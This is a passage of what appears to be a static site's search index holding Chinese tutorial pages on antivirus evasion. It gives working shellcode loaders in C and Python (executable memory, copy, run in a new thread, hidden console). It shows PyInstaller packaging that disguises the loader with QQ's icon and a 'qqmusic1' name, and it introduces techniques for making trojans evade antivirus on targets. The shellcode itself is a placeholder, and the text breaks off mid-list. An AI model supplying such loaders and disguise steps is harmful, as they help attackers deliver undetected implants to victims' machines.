<p>\u628ashellcode\u653e\u5230\u8fd9\u5757\u5185\u5b58\u4e2d</p> </li> <li> <p>\u60f3\u529e\u6cd5\u8ba9\u8fd9\u5757\u5185\u5b58\u4e2d\u7684shellcode\u88abcpu\u6267\u884c \u56de\u8c03\u51fd\u6570\u6267\u884c</p> </li> </ul> <p>\u603b\u800c\u8a00\u4e4b</p> <p>\u7533\u8bf7\u5185\u5b58--&gt;\u628ashellcode\u52a0\u8f7d\u5230\u5185\u5b58--&gt;\u8ba9\u8fd9\u6bb5\u5185\u5b58\u91cc\u7684\u4e1c\u897f\u8fd0\u884c\u8d77\u6765</p> <p>\u90a3\u4e48\u95ee\u9898\u6765\u4e86, \u600e\u4e48\u5f00\u8f9f\u5185\u5b58, \u600e\u4e48\u590d\u5236shellcode\u653e\u5230\u8fd9\u5757\u5185\u5b58? \u600e\u4e48\u8ba9shellcode\u6267\u884c? \u597d\u5728windows \u81ea\u5e26\u7684\u4e00\u4e9bapi\u51fd\u6570\u53ef\u4ee5\u5e2e\u6211\u4eec\u5b9e\u73b0</p>"},{"location":"CTF/Antimalware_evasion/AV/Article3/index.html#14virtualalloc","title":"1.4VirtualAlloc\u51fd\u6570","text":"<p>VirtualAlloc \u662f Windows API \u4e2d\u7528\u4e8e \u5206\u914d/\u7533\u8bf7\u3001\u4fdd\u7559\u6216\u63d0\u4ea4\u5185\u5b58\u533a\u57df\u7684\u51fd\u6570 \uff0cVirtualAlloc \u901a\u5e38\u7528\u4e8e\u9ad8\u6548\u5730\u5206\u914d\u548c\u7ba1\u7406\u8f83\u5927\u7684\u5185\u5b58\u5757\uff0c\u7279\u522b\u662f\u5728\u9700\u8981\u8fdb\u884c\u7cbe\u7ec6\u5185\u5b58\u63a7\u5236\u7684\u60c5\u51b5\u4e0b\u3002\u5176\u539f\u578b(\u5b9a\u4e49)\u5982\u4e0b\uff1a</p> <pre><code>LPVOID VirtualAlloc(\n  LPVOID lpAddress,         // \u6307\u5b9a\u60f3\u8981\u5206\u914d\u5185\u5b58\u7684\u9996\u5730\u5740\uff0c\u901a\u5e38\u4e3a NULL\uff0c\u8868\u793a\u7cfb\u7edf\u81ea\u52a8\u9009\u62e9\u5730\u5740\u3002\n  SIZE_T dwSize,            // \u8981\u5206\u914d\u7684\u5185\u5b58\u5757\u7684\u5927\u5c0f\uff0c\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u3002\n  DWORD flAllocationType,   // \u5185\u5b58\u5206\u914d\u7684\u7c7b\u578b\uff0c\u6bd4\u5982 MEM_COMMIT \u6216 MEM_RESERVE\u3002\n  DWORD flProtect           // \u5206\u914d\u5185\u5b58\u7684\u4fdd\u62a4\u5c5e\u6027\uff0c\u5982 PAGE_READWRITE\u3001PAGE_EXECUTE_READWRITE \u7b49\u3002\n);\n</code></pre> <p>\u53c2\u6570\u7684\u542b\u4e49\u5982\u4e0b\uff1a</p> <ol> <li> <p>lpAddress : \u6307\u5b9a\u5206\u914d\u6216\u4fdd\u7559\u7684\u5185\u5b58\u533a\u57df\u7684\u9996\u9009\u57fa\u5730\u5740\u3002\u5982\u679c\u6b64\u53c2\u6570\u4e3a NULL \uff0c\u5219\u7cfb\u7edf\u4f1a\u9009\u62e9\u9002 \u5f53\u7684\u5730\u5740\u3002\u5982\u679c\u6307\u5b9a\u4e86\u5730\u5740\uff0c\u7cfb\u7edf\u5c06\u5c1d\u8bd5\u5728\u6307\u5b9a\u7684\u57fa\u5730\u5740\u4e0a\u5206\u914d\u5185\u5b58\u3002\u6ce8\u610f\uff0c\u6b64\u5730\u5740\u5fc5\u987b\u662f\u9875\u5bf9 \u9f50\u7684\u3002</p> </li> <li> <p>dwSize : \u6307\u5b9a\u8981\u5206\u914d\u7684\u5185\u5b58\u533a\u57df\u7684\u5927\u5c0f\uff0c\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u3002</p> </li> <li> <p>flAllocationType : \u6307\u5b9a\u5185\u5b58\u7684\u5206\u914d\u7c7b\u578b\u3002\u53ef\u80fd\u7684\u503c\u5305\u62ec\uff1a</p> </li> <li> <p>MEM_COMMIT (0x1000) : \u5c06\u7269\u7406\u9875\u9762\u5206\u914d\u7ed9\u5185\u5b58\u4e2d\u7684\u4e00\u4e2a\u6216\u591a\u4e2a\u9875\uff0c\u5e76\u5c06\u8fd9\u4e9b\u9875\u7684\u5185\u5bb9\u521d \u59cb\u5316\u4e3a\u96f6\u3002\u5982\u679c\u540c\u65f6\u6307\u5b9a\u4e86 MEM_RESERVE\uff0c\u5219\u7cfb\u7edf\u4f1a\u4fdd\u7559\u8fd9\u4e9b\u9875\u7684\u5730\u5740\u7a7a\u95f4\u800c\u4e0d\u5c06\u5b83\u4eec \u5206\u914d\u7ed9\u4efb\u4f55\u7269\u7406\u9875\u9762\u3002</p> </li> <li>MEM_RESERVE (0x2000) : \u4fdd\u7559\u6307\u5b9a\u5730\u5740\u7a7a\u95f4\uff0c\u4e0d\u5206\u914d\u7269\u7406\u5185\u5b58\u3002\u8fd9\u6837\u53ef\u4ee5\u963b\u6b62\u5176\u4ed6\u5185\u5b58\u5206 \u914d\u51fd\u6570malloc\u548cLocalAlloc\u7b49\u518d\u4f7f\u7528\u5df2\u4fdd\u7559\u7684\u5185\u5b58\u8303\u56f4,\u76f4\u5230\u5b83\u88ab\u91ca\u653e\u3002\u5f53\u4f7f\u7528\u4e0a\u9762\u7684 VirtualAlloc\u51fd\u6570\u4fdd\u7559\u4e86\u4e00\u6bb5\u5730\u5740\u7a7a\u95f4\u540e\uff0c\u63a5\u4e0b\u8fd8\u4f60\u8fd8\u53ef\u4ee5\u7ee7\u7eed\u591a\u6b21\u8c03\u7528\u540c\u6837\u7684\u51fd\u6570\u63d0\u4ea4\u8fd9 \u6bb5\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u4e0d\u540c\u9875\u9762\u3002</li> <li> <p>MEM_RESET (0x80000) : \u5c06\u5206\u914d\u7684\u9875\u9762\u7684\u5185\u5bb9\u521d\u59cb\u5316\u4e3a\u96f6\u3002\u8fd9\u4e2a\u6807\u5fd7\u4ec5\u5728\u4f7f\u7528  MEM_COMMIT \u6807\u5fd7\u65f6\u624d\u6709\u610f\u4e49\u3002</p> </li> <li> <p>flProtect : \u6307\u5b9a\u5185\u5b58\u4fdd\u62a4\u5c5e\u6027\u3002\u53ef\u80fd\u7684\u503c\u5305\u62ec\uff1a</p> </li> <li> <p>PAGE_EXECUTE (0x10) : \u5141\u8bb8\u9875\u9762\u88ab\u6267\u884c\u3002</p> </li> <li>PAGE_EXECUTE_READ (0x20) : \u5141\u8bb8\u9875\u9762\u88ab\u6267\u884c\u548c\u8bfb\u53d6\u3002</li> <li>PAGE_EXECUTE_READWRITE (0x40) : \u5141\u8bb8\u9875\u9762\u88ab\u6267\u884c\u3001\u8bfb\u53d6\u548c\u5199\u5165\u3002\u53ef\u8bfb\u53ef\u5199\u53ef\u6267\u884c</li> <li>PAGE_EXECUTE_WRITECOPY (0x80) : \u5141\u8bb8\u9875\u9762\u88ab\u6267\u884c\u548c\u5199\u5165\u3002\u9875\u9762\u5185\u5bb9\u53ef\u4ee5\u88ab\u5176\u4ed6\u8fdb\u7a0b\u5199 \u5165\u3002</li> <li>PAGE_READONLY (0x02) : \u5141\u8bb8\u9875\u9762\u88ab\u8bfb\u53d6\u3002</li> <li>PAGE_READWRITE (0x04) : \u5141\u8bb8\u9875\u9762\u88ab\u8bfb\u53d6\u548c\u5199\u5165\u3002</li> <li>PAGE_WRITECOPY (0x08) : \u5141\u8bb8\u9875\u9762\u88ab\u5199\u5165\u3002\u9875\u9762\u5185\u5bb9\u53ef\u4ee5\u88ab\u5176\u4ed6\u8fdb\u7a0b\u5199\u5165\u3002</li> </ol>"},{"location":"CTF/Antimalware_evasion/AV/Article3/index.html#15memcpy","title":"1.5memcpy\u51fd\u6570","text":"<p>memcpy \u662f C \u6807\u51c6\u5e93\u4e2d\u7684\u4e00\u4e2a\u51fd\u6570\uff0c\u7528\u4e8e\u5c06\u5185\u5b58\u5757\u7684\u5185\u5bb9\u4ece\u4e00\u4e2a\u4f4d\u7f6e\u590d\u5236\u5230\u53e6\u4e00\u4e2a\u4f4d\u7f6e</p> <pre><code>void *memcpy( \n void *dest,\n const void *src, \n size_t n\n );\n</code></pre> <p></p> <ol> <li>dest : \u6307\u5411\u76ee\u6807\u5185\u5b58\u533a\u57df\u7684\u6307\u9488\uff0c\u5373\u590d\u5236\u64cd\u4f5c\u7684\u76ee\u6807\u4f4d\u7f6e\u3002</li> <li>src : \u6307\u5411\u6e90\u5185\u5b58\u533a\u57df\u7684\u6307\u9488\uff0c\u5373\u590d\u5236\u64cd\u4f5c\u7684\u6e90\u4f4d\u7f6e\u3002</li> <li>n : \u8981\u590d\u5236\u7684\u5b57\u8282\u6570\u3002</li> </ol> <p>\u73b0\u5728\u5185\u5b58\u76f8\u5173\u7684\u64cd\u4f5c, \u8fd9\u4e9b\u51fd\u6570\u90fd\u53ef\u4ee5\u5b9e\u73b0\u4e86, \u5c31\u5dee\u600e\u4e48\u6267\u884cshellcode\u4e86, \u6267\u884cshellcode\u7684\u65b9\u5f0f\u5f88\u591a, \u540e\u9762\u4f1a\u4e13\u95e8\u62ff\u51fa\u6765\u603b\u7ed3\u90fd\u6709\u54ea\u4e9b, \u5f53\u4e0b\u6211\u4eec\u4f7f\u7528 \u521b\u5efa\u7ebf\u7a0b \u8fd0\u884c\u6211\u4eec\u7684shellcode, \u8fd9\u5c31\u9700\u8981 CreateThread\u3002</p>"},{"location":"CTF/Antimalware_evasion/AV/Article3/index.html#16createthread","title":"1.6CreateThread","text":"<p>CreateThread \u662f Windows API \u4e2d\u7528\u4e8e\u521b\u5efa\u65b0\u7ebf\u7a0b\u7684\u51fd\u6570\u3002\u5176\u539f\u578b\u5982\u4e0b</p> <pre><code>HANDLE CreateThread(\n  LPSECURITY_ATTRIBUTES lpThreadAttributes,  // \u7ebf\u7a0b\u7684\u5b89\u5168\u5c5e\u6027\uff0c\u4e00\u822c\u8bbe\u7f6e\u4e3a NULL\u3002\n  SIZE_T dwStackSize,                        // \u7ebf\u7a0b\u7684\u521d\u59cb\u5806\u6808\u5927\u5c0f\uff0c\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u30020 \u8868\u793a\u4f7f\u7528\u7cfb\u7edf\u9ed8\u8ba4\u503c\u3002\n  LPTHREAD_START_ROUTINE lpStartAddress,     // \u7ebf\u7a0b\u6267\u884c\u7684\u5165\u53e3\u51fd\u6570\u5730\u5740\u3002\n  LPVOID lpParameter,                        // \u4f20\u9012\u7ed9\u7ebf\u7a0b\u5165\u53e3\u51fd\u6570\u7684\u53c2\u6570\u3002\n  DWORD dwCreationFlags,                     // \u7ebf\u7a0b\u521b\u5efa\u6807\u5fd7\uff0c\u51b3\u5b9a\u7ebf\u7a0b\u662f\u7acb\u5373\u6267\u884c\u8fd8\u662f\u6302\u8d77\u72b6\u6001\u3002\n  LPDWORD lpThreadId                         // \u6307\u5411\u63a5\u6536\u7ebf\u7a0bID\u7684\u53d8\u91cf\u3002\n);\n</code></pre> <p>1.lpThreadAttributes : \u4e00\u4e2a\u6307\u5411 SECURITY_ATTRIBUTES \u7ed3\u6784\u7684\u6307\u9488\uff0c\u7528\u4e8e\u6307\u5b9a\u65b0\u7ebf\u7a0b\u7684\u5b89\u5168 \u6027\u3002\u53ef\u4ee5\u4e3a NULL \uff0c\u8868\u793a\u4f7f\u7528\u9ed8\u8ba4\u7684\u7ebf\u7a0b\u5b89\u5168\u6027\u3002</p> <p>2.dwStackSize : \u6307\u5b9a\u65b0\u7ebf\u7a0b\u7684\u521d\u59cb\u5806\u6808\u5927\u5c0f\u3002\u53ef\u4ee5\u4e3a 0\uff0c\u8868\u793a\u4f7f\u7528\u9ed8\u8ba4\u5806\u6808\u5927\u5c0f\u3002</p> <p>3.lpStartAddress : \u6307\u5411\u7ebf\u7a0b\u51fd\u6570\u7684\u6307\u9488\uff0c\u5373\u65b0\u7ebf\u7a0b\u7684\u5165\u53e3\u70b9\u3002\u7ebf\u7a0b\u51fd\u6570\u662f\u4e00\u4e2a  LPTHREAD_START_ROUTINE \u7c7b\u578b\u7684\u51fd\u6570\u6307\u9488\uff0c\u901a\u5e38\u662f\u7ebf\u7a0b\u7684\u4e3b\u8981\u6267\u884c\u4f53\u3002</p> <p>4.lpParameter : \u4f20\u9012\u7ed9\u7ebf\u7a0b\u51fd\u6570\u7684\u53c2\u6570\u3002\u8fd9\u662f\u4e00\u4e2a\u6307\u5411\u4efb\u610f\u7c7b\u578b\u7684\u6307\u9488\uff0c\u53ef\u4ee5\u7528\u6765\u4f20\u9012\u6570\u636e\u7ed9\u7ebf\u7a0b \u51fd\u6570\u3002</p> <p>5.dwCreationFlags : \u6307\u5b9a\u65b0\u7ebf\u7a0b\u7684\u521b\u5efa\u6807\u5fd7\u3002\u5e38\u7528\u7684\u6807\u5fd7\u5305\u62ec\uff1a</p> <ul> <li> <p>0 : \u9ed8\u8ba4\u6807\u5fd7\uff0c\u8868\u793a\u7ebf\u7a0b\u7acb\u5373\u53ef\u6267\u884c\u3002</p> </li> <li> <p>CREATE_SUSPENDED (0x00000004) : \u521b\u5efa\u540e\u7ebf\u7a0b\u5904\u4e8e\u6302\u8d77\u72b6\u6001\uff0c\u9700\u8981\u8c03\u7528 ResumeThread \u624d\u80fd\u6267\u884c\u3002</p> </li> </ul> <p>6.lpThreadId : \u4e00\u4e2a\u6307\u5411 DWORD \u7684\u6307\u9488\uff0c\u7528\u4e8e\u63a5\u6536\u65b0\u7ebf\u7a0b\u7684\u6807\u8bc6\u7b26\uff08\u7ebf\u7a0b ID\uff09\u3002\u5982\u679c\u4e0d\u9700\u8981\u7ebf \u7a0b ID\uff0c\u53ef\u4ee5\u4f20\u9012 NULL \u3002</p>"},{"location":"CTF/Antimalware_evasion/AV/Article3/index.html#4c","title":"4.C\u8bed\u8a00 \u52a0\u8f7d\u5668","text":"<p>windows api\u51fd\u6570\u6211\u4eec\u4e86\u89e3\u4e86, \u4f46\u662f\u5982\u4f55\u4f7f\u7528\u8fd9\u4e9b\u51fd\u6570\u7684? \u7528\u4ec0\u4e48\u7f16\u7a0b\u8bed\u8a00\u5462?\u81ea\u7136\u662fc\u8bed\u8a00\u5566, \u5728c\u8bed\u8a00\u4e2d\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u8c03\u7528 windows api\u51fd\u6570, \u5e2e\u52a9\u6211\u4eec\u7f16\u5199shellcode\u52a0\u8f7d\u5668</p>"},{"location":"CTF/Antimalware_evasion/AV/Article3/index.html#41","title":"4.1\u52a0\u8f7d\u5668\u4ee3\u7801","text":"<pre><code>#include &lt;windows.h&gt; // Windows API \u548c \u4e00\u4e9b\u5e38\u91cf\n#include &lt;stdio.h&gt; // \u6807\u51c6\u8f93\u5165\u8f93\u51fa\u5e93\u7684\u5934\u6587\u4ef6\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n\u53e3\nunsigned char buf[] = \"16\u8fdb\u5236\u5b57\u7b26\u4e32shellcode \\xfc\";\nvoid main() {\n // \u4f7f\u7528VirtualAlloc \u51fd\u6570\u7533\u8bf7\u4e00\u4e2a shellcode\u5b57\u8282\u5927\u5c0f\u7684\u53ef\u4ee5\u6267\u884c\u4ee3\u7801\u7684\u5185\u5b58\u5757\n LPVOID exec = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, \nPAGE_EXECUTE_READWRITE);\n // \u7533\u8bf7\u5931\u8d25 , \u9000\u51fa\n if (exec == NULL) {\n return;\n }\n // \u628ashellcode\u62f7\u8d1d\u5230\u8fd9\u5757\u5185\u5b58\n memcpy(exec, buf, sizeof(buf));\n // \u521b\u5efa\u7ebf\u7a0b\u8fd0\u884c\n HANDLE hThread = CreateThread(\nNULL,\n NULL,\n (LPTHREAD_START_ROUTINE)exec,\n NULL,\n NULL,\n 0);\n // \u7b49\u5f85\u7ebf\u7a0b\u8fd0\u884c\n WaitForSingleObject(hThread, -1);\n // \u5173\u95ed\u7ebf\u7a0b\n CloseHandle(hThread);\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article3/index.html#5python","title":"5.Python\u8bed\u8a00 \u52a0\u8f7d\u5668","text":""},{"location":"CTF/Antimalware_evasion/AV/Article3/index.html#51","title":"5.1\u52a0\u8f7d\u5668\u4ee3\u7801","text":"<p>\u5b9e\u9645\u4e0a\u8fd8\u662f\u501f\u52a9\u90a3\u4e9bwindows api , \u4f46\u662fcopy\u5185\u5b58\u7684\u4e0a\u9762\u662fc\u6807\u51c6\u5e93\u7684\u51fd\u6570, \u5b9e\u9645\u4e0awindows \u81ea\u5e26\u7684\u4e5f\u6709copy\u5185\u5b58\u7684\u51fd\u6570, \u90a3\u4e48\u63a5\u4e0b\u6765\u7684\u7f16\u5199\u6d41\u7a0b\u4e5f\u975e\u5e38\u6e05\u695a\u4e86, \u5c31\u662f\u5982\u4f55\u901a\u8fc7Python\u4ee3\u7801\u5b9e\u73b0\u4e0a\u8ff0\u90a3\u4e9b\u51fd\u6570\u7684\u8c03\u7528, \u4ee5\u53ca\u5728Python\u4e2d16\u8fdb\u5236\u7684shellcode\u662f\u5982\u4f55\u5b57\u9762\u91cf\u5b9a\u4e49\u7684</p> <pre><code># \u5bfc\u5165 ctypes\u5e93\nimport ctypes\n# \u4ecectypes\u5e93\u4e2d\u5bfc\u5165windows api\u51fd\u6570\nVirtualAlloc = ctypes.windll.kernel32.VirtualAlloc\nRtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory\nCreateThread = ctypes.windll.kernel32.CreateThread\nWaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject\n# shellcode\u53ef\u4ee5\u7528cs\u6765\u751f\u6210\nbuf = b\"\\xfc...\"\n# shellcode\u8f6c\u6210bytearray\u7c7b\u578b\nsc = bytearray(buf)\n# \u8bbe\u7f6eVirtualAlloc\nVirtualAlloc.restype = ctypes.c_uint64 # \u91cd\u8f7d\u51fd\u6570\u8fd4\u56de\u7c7b\u578b\u4e3ac_uint64\np = VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(sc)), 0x3000, 0x00000040) # \u7533\u8bf7\u5185\u5b58\nbuf = (ctypes.c_char * len(sc)).from_buffer(sc) # \u5c06sc\u6307\u5411\u6307\u9488\nRtlMoveMemory(ctypes.c_void_p(p), buf, ctypes.c_int(len(sc))) # \u590d\u5236sc\u8fdb\u7533\u8bf7\u7684\u5185\u5b58\u4e2d\nh = CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_void_p(p), ctypes.c_int(0), \nctypes.c_int(0),\nctypes.pointer(ctypes.c_int(0))) # \u6267\u884c\u521b\u5efa\u7ebf\u7a0b\nWaitForSingleObject(ctypes.c_int(h), ctypes.c_int(-1)) # \u68c0\u6d4b\u7ebf\u7a0b\u521b\u5efa\u4e8b\u4ef6\n# ctypes.c_int(0) NULL/0\n# ctypes.c_void_p(p) \u6307\u9488\u7c7b\u578b\n</code></pre> <p>\u89e3\u91ca\u6bcf\u4e2a\u90e8\u5206\uff1a</p> <ol> <li>import ctypes : \u5bfc\u5165 ctypes \u6a21\u5757\uff0c\u8fd9\u4e2a\u6a21\u5757\u63d0\u4f9b\u4e86\u4e0e C \u8bed\u8a00\u517c\u5bb9\u7684\u6570\u636e\u7c7b\u578b\u548c\u51fd\u6570\u8c03\u7528\u65b9\u5f0f\u3002</li> <li>VirtualAlloc , RtlMoveMemory , CreateThread , WaitForSingleObject : \u8fd9\u4e9b\u53d8\u91cf\u662f\u901a\u8fc7 ctypes  \u83b7\u53d6 kernel32.dll \u4e2d\u76f8\u5173\u51fd\u6570\u7684\u53e5\u67c4\uff0c\u7528\u4e8e\u5185\u5b58\u64cd\u4f5c\u548c\u7ebf\u7a0b\u521b\u5efa\u7b49\u64cd\u4f5c\u3002</li> <li>buf = b\"\\xfc...\" : \u5b9a\u4e49\u4e86\u4e00\u4e2a\u5305\u542b shellcode \u7684\u5b57\u8282\u6570\u7ec4\u3002\u8fd9\u91cc\u7684 \\xfc... \u8868\u793a shellcode \u7684\u4e8c\u8fdb \u5236\u5185\u5bb9\u3002</li> <li>shellcode = bytearray(buf) : \u5c06 shellcode \u8f6c\u6362\u4e3a bytearray \u7c7b\u578b\u3002</li> <li>VirtualAlloc.restype = ctypes.c_uint64 : \u8bbe\u7f6e VirtualAlloc \u51fd\u6570\u7684\u8fd4\u56de\u7c7b\u578b\u4e3a c_uint64 \u3002</li> <li>p = VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), 0x3000, 0x00000040) : \u8c03\u7528  VirtualAlloc \u5206\u914d\u5185\u5b58\uff0c\u7528\u4e8e\u5b58\u653e shellcode\u3002 0x3000 \u8868\u793a\u5206\u914d\u63d0\u4ea4\uff08MEM_COMMIT\uff09\u548c\u4fdd \u7559\uff08MEM_RESERVE\uff09\u7684\u5185\u5b58\uff0c 0x00000040 \u8868\u793a\u5206\u914d\u53ef\u6267\u884c \uff08PAGE_EXECUTE_READWRITE\uff09\u7684\u5185\u5b58\u3002</li> <li>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) : \u5c06 shellcode \u7684\u5185\u5bb9\u6307\u5411\u6307\u9488\u3002</li> <li>RtlMoveMemory(ctypes.c_void_p(p), buf, ctypes.c_int(len(shellcode))) : \u4f7f\u7528 RtlMoveMemory \u51fd\u6570\u5c06 shellcode \u590d\u5236\u5230\u7533\u8bf7\u7684\u5185\u5b58\u4e2d\u3002</li> <li>h = CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_void_p(p), ctypes.c_int(0),  ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0))) : \u8c03\u7528 CreateThread \u521b\u5efa\u4e00\u4e2a\u65b0\u7ebf\u7a0b\uff0c\u5c06\u521a\u624d\u5206 \u914d\u7684\u5185\u5b58\u4f5c\u4e3a\u7ebf\u7a0b\u7684\u8d77\u59cb\u5730\u5740\u3002</li> <li>WaitForSingleObject(ctypes.c_int(h), ctypes.c_int(-1)) : \u4f7f\u7528 WaitForSingleObject \u7b49\u5f85\u7ebf\u7a0b\u7684\u7ed3 \u675f\u3002 -1 \u8868\u793a\u65e0\u9650\u7b49\u5f85\uff0c\u76f4\u5230\u7ebf\u7a0b\u7ed3\u675f</li> </ol> <p>\u8fd9\u6bb5\u4ee3\u7801\u7684\u4f5c\u7528\u662f\u5c06 shellcode \u653e\u5165\u7533\u8bf7\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u7ebf\u7a0b\uff0c\u5e76\u5728\u65b0\u7ebf\u7a0b\u4e2d\u6267\u884c shellcode\u3002</p>"},{"location":"CTF/Antimalware_evasion/AV/Article3/index.html#52pythonexe","title":"5.2Python\u6253\u5305exe","text":"<p>\u5b89\u88c5</p> <pre><code>pip3 install pyinstaller\n</code></pre> <p>\u6253\u5305\u547d\u4ee4</p> <pre><code>pyinstaller -F -w demo.py\n-F \u6253\u5305\u6210\u4e00\u4e2aexe\u6587\u4ef6\n-w \u4e0d\u663e\u793a\u9ed1\u7a97\u53e3 (\u9ed8\u8ba4\u4f1a\u663e\u793a) , \u4e5f\u53ef\u4ee5\u7528 --noconsole \u53c2\u6570\n-i \u6307\u5b9a\u56fe\u6807 , .ico\u6587\u4ef6 \u6216\u8005\u662fexe\u6587\u4ef6 , \u4f1a\u81ea\u52a8\u63d0\u53d6exe\u6587\u4ef6\u7684\u56fe\u6807 (\u4e0d\u63a8\u8350\u56fe\u6807)\n-n \u6307\u5b9a\u6253\u5305\u597d\u7684\u6587\u4ef6\u540d\n--clean \u6e05\u9664\u4e0a\u4e00\u6b21\u6253\u5305\u7684\u6587\u4ef6\n--key cjiurfe11a \u6df7\u6dc6\u4ee3\u7801\u529f\u80fd (\u9700\u8981\u5b89\u88c5 pip3 install tinyaes)\n</code></pre> <p>\u6253\u5305\u597d\u7684\u7a0b\u5e8f\u5728 dist \u76ee\u5f55\u4e0b , dist\u662fdistribution\u7684\u7b80\u5199 , \u53d1\u884c\u7248\u672c</p> <p>\u793a\u4f8b\uff1a</p> <pre><code> pyinstaller -F -i \"C:\\\\Program Files (x86)\\\\Tencent\\\\QQNT\\\\QQ.exe\" -n qqmusic1 main.py\n</code></pre> <p></p> <p>\u6ce8\u610f:py\u4e0d\u652f\u6301\u4ea4\u53c9\u7f16\u8bd1 , \u4ec0\u4e48\u610f\u601d\u5c31\u662fwindows\u4f60\u53ea\u80fd\u6253\u5305\u6210exe , \u4e0d\u80fd\u6253\u5305\u6210linux\u4e0a\u7684\u53ef\u6267\u884c\u4e8c\u8fdb\u5236\u6587\u4ef6</p>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html","title":"1.\u514d\u6740\u4ecb\u7ecd","text":""},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#11","title":"1.1\u4ec0\u4e48\u662f\u514d\u6740","text":"<p>\u514d\u6740\uff0c\u4e5f\u5c31\u662f\u53cd\u75c5\u6bd2(AntiVirus)\u4e0e\u53cd\u95f4\u8c0d(AntiSpyware)\u7684\u5bf9\u7acb\u9762\uff0c\u82f1\u6587\u4e3aAnti-AntiVirus(\u7b80\u5199 Virus AV) \uff0c \u9010\u5b57\u7ffb\u8bd1\u4e3a\"\u53cd - \u53cd\u75c5\u6bd2\"\uff0c\u7ffb\u8bd1\u4e3a\"\u53cd\u75c5\u6bd2\u6280\u672f\"\u3002</p> <p>\u5b83\u662f\u4e00\u79cd\u80fd\u4f7f\u75c5\u6bd2\u6728\u9a6c\u514d\u4e8e\u88ab\u6740\u6bd2\u8f6f\u4ef6\u67e5\u6740\u7684\u6280\u672f\u3002\u7531\u4e8e\u514d\u6740\u6280\u672f\u7684\u6d89\u730e\u9762\u975e\u5e38\u5e7f\uff0c\u5176\u4e2d\u5305\u542b\u53cd\u6c47\u7f16\u3001\u9006\u5411\u5de5\u7a0b\u3001\u7cfb\u7edf\u6f0f\u6d1e\u7b49\u9ed1\u5ba2\u6280\u672f\uff0c\u6240\u4ee5\u96be\u5ea6\u5f88\u9ad8\uff0c\u4e00\u822c\u4eba\u4e0d\u4f1a\u6216\u8005\u6ca1\u80fd\u529b\u63a5\u89e6\u8fd9\u4e9b\u6df1\u5c42\u6280\u672f\u3002\u5176\u5185\u5bb9\u57fa\u672c\u4e0a\u90fd\u662f\u4fee\u6539\u75c5\u6bd2\u3001\u6728\u9a6c\u7684\u5185\u5bb9\u6539\u53d8\u7279\u5f81\u7801\uff0c\u4ece\u800c\u8eb2\u907f\u4e86\u6740\u6bd2\u8f6f\u4ef6\u7684\u67e5\u6740\u3002</p> <p>\u7b80\u5355\u6765\u8bf4\u5c31\u662f\uff1a\u5c31\u662f\u901a\u8fc7\u4e00\u4e9b\u6280\u672f\u624b\u6bb5 , \u8ba9\u4f60\u7684 \u6076\u610f\u6837\u672c ( \u6728\u9a6c\u548c\u75c5\u6bd2 ) \u89c4\u907f\u6389\u6740\u6bd2\u8f6f\u4ef6\u7684\u68c0\u6d4b , \u80fd\u591f\u50cf\u6b63\u5e38\u7a0b\u5e8f\u4e00\u6837\u8fd0\u884c\u3002</p>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#12","title":"1.2\u4e3a\u4ec0\u4e48\u6709\u514d\u6740","text":"<p>\u9ed8\u8ba4\u4e00\u4e9bc2 ( command &amp;&amp; control ) \u751f\u6210\u7684\u6728\u9a6c ( \u6076\u610f\u6837\u672c ) , \u5176\u7279\u5f81\u5df2\u7ecf\u88ab\u5404\u5927\u6740\u6bd2\u8f6f\u4ef6\u7ed9\u6807\u8bb0\u5230\u4e86\u81ea\u5df1\u7684\u6728\u9a6c\u75c5\u6bd2\u5e93\u4e2d , \u6240\u4ee5\u5728\u5b9e\u6218\u4e2d\u5982\u679c\u76ee\u6807\u5b58\u5728\u6740\u8f6f , \u6211\u4eec\u9700\u8981\u5bf9\u81ea\u5df1\u7684\u6728\u9a6c ( \u6076\u610f\u6837\u672c ) \u8fdb\u884c\u514d\u6740\u3002</p>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#13","title":"1.3\u514d\u6740\u7684\u65b9\u6cd5\u6709\u54ea\u4e9b","text":"<p>\u5e38\u89c1\u7684\u514d\u6740\u65b9\u6cd5</p> <pre><code>1.\u52a0\u58f3 \n2.shellcode\u6df7\u6dc6, \u52a0\u5bc6 \n3.\u5404\u79cd\u8bed\u8a00\u7684\u52a0\u8f7d\u5668, c, python , go\u7b49\n4.powershell \u6df7\u6dc6\u514d\u6740 \n5.\u5206\u79bb\u514d\u6740 ( \u8fdc\u7a0b\u52a0\u8f7d ) shellcode\u548c\u52a0\u8f7d\u5668\u4e0d\u5199\u5728\u4e00\u4e2a\u6587\u4ef6\u4e2d , \u8fdc\u7a0b\u52a0\u8f7d\u7b49\n6.\u767d\u52a0\u9ed1 ( \u767d\u540d\u5355\u7a0b\u5e8f\u6267\u884c\u6076\u610f\u6837\u672c )\n7.\u4f7f\u7528 github \u4e0a\u7684\u4e00\u4e9b\u514d\u6740\u5de5\u5177\n8.\u81ea\u5df1\u5199\u52a0\u8f7d\u5668, 